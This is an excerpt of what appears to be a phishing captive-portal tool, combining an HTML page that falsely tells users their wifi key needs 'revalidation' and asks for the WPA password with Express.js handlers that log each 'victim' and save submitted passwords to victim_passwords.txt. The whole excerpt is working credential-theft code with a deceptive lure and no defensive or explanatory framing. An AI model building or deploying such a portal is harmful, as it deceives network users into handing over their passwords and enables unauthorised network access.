...
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="./wifi-icon.png" alt="" width="180vw">
      
      <p>Your wifi key needs to be revalidated for security reasons.</p> 
	  <form method="post" action="password" id="mform">
		<p>Please enter your modem's WPA WiFi key (Password) to reconnect to the internet: </p>
		<input type="password" name="password" size="35%">
		<password><p><input type="submit" name="button"  value="Connect"></p>
	  </form> 
  </div>
...
app.get('/', (req, res) => {
    ...
    console.log('A client has fallen into your Captive Portal!\nWait for them to take an action...');
...
app.post('/password', (req, res) => {
    ...
    console.log(`\nClient sent content: ${password}\nCheckout victim_passwords.txt to see all saved content.\n`);
    /*
...
app.listen(port, () => {
    console.log(`Captive Portal is up!\nListening at http://localhost:${port}`);
})